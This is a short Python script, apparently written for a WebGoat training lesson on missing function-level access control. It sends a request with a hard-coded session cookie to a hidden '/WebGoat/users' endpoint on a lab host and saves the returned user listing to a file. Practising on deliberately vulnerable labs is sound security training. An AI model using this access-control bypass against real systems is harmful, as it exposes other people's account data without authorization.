import requests
from os.path import abspath, dirname


base_url = "http://10.1.121.141:8080"
cookie = {"JSESSIONID":"0A0D49A176C2B9C609E4C99329C31234"}
result_file_name = "MFAC.txt"

relative_url = "/WebGoat/users"
result_file_path = dirname(abspath(__file__)) + "\\" + result_file_name

headers = {'Content-Type': 'application/json'}

url = base_url + relative_url

r = requests.get(url, headers = headers, cookies=cookie)
with open(result_file_path, 'w') as file:
    file.write(r.text)